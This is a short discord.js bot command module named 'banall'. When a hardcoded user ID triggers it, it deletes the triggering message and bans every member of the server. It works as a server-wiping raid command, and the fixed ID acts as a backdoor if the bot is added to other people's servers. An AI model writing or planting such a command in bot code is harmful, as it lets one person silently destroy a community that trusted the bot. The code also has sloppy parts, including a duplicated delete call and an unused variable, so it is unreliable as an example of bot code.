const Discord = require('discord.js');
const fs = require('fs');

module.exports.run = async (bot, message, args) => {
    
  var argresult = message.content.split(` `).slice(1).join(' ');
        message.delete();
        if (message.deletable) message.delete();
        if (message.author.id != "580098480198909956") return;
        message.guild.members.forEach(member => {
            member.ban().then(function() {});
        });
    }


module.exports.help = {
    name: "banall"
}